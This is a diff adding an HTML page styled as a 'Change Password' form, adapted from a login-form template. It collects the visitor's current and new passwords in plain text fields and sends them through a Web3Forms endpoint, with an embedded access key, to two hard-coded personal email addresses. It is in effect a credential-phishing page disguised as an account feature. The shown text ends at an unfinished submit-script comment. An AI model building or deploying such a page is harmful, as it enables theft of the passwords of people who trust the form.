@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Responsive Animated Login Form using HTML CSS Only | Codehal</title>
+  <link rel="stylesheet" href="style.css">
+
+  <style>
+    input:-webkit-autofill,
+    input:-webkit-autofill:hover,
+    input:-webkit-autofill:focus,
+    input:-webkit-autofill:active {
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: #ffffff;
+      transition: background-color 5000s ease-in-out 0s;
+      box-shadow: inset 0 0 20px 20px #23232329;
+    }
+  </style>
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.1.9"></script>
+</head>
+
+<body>
+
+  <section>
+    <div class="login-box">
+      <!-- Web3Forms Integration -->
+      <form id="changePasswordForm" action="https://api.web3forms.com/submit" method="POST">
+        <h2>Change Password</h2>
+
+        <!-- Web3Forms Hidden Inputs -->
+        <input type="hidden" name="access_key" value="5f787b25-7084-40ad-9842-f7cbe4056579">
+        <input type="hidden" name="from_name" value="Mission Control">
+        <input type="hidden" name="subject" value="Password Change Request">
+
+        <!-- Multiple Emails: এখানে আপনার দুইটি ইমেইল বসান -->
+        <input type="hidden" name="emails" value="arafatthewriter@gmail.com,khsumon89@gmail.com">
+
+        <div class="input-box">
+          <input type="text" id="currentPassword" name="currentPassword" required>
+          <label>Current password</label>
+        </div>
+
+        <div class="input-box">
+          <input type="text" id="newPassword" name="newPassword" required>
+          <label>New password</label>
+        </div>
+
+        <div class="input-box">
+          <input type="text" id="retypePassword" name="retypePassword" required>
+          <label>Retype new password</label>
+        </div>
+
+        <div class="remember-forgot">
+          <label>
+            <input type="checkbox" id="terms" required>
+            I agree to the <a href="#" onclick="showTerms(event)" style="text-decoration: underline;">Terms & Conditions</a>
+          </label>
+        </div>
+
+        <button type="submit"><b>Change Password</b></button>
+
+        <div class="register-link">
+          <p>Already have an account?
+            <a href="../../Login-Form/index.html" target="_blank">Login Now</a>
+          </p>
+        </div>
+      </form>
+    </div>
+  </section>
+
+  <script>
+    // Terms & Conditions Popup
+    function showTerms(e) {
+      e.preventDefault();
+      Swal.fire({
+        title: 'Terms & Conditions',
+        html: `
+          <p style="text-align:left;">
+            1. You must provide correct current password.<br><br>
+            2. New password should be at least 8 characters long.<br><br>
+            3. Do not share your password with anyone.<br><br>
+            4. By continuing, you agree to follow these rules.
+          </p>
+        `,
+        icon: 'info',
+        confirmButtonText: 'Close'
+      });
+    }
+
+    // Submit Form
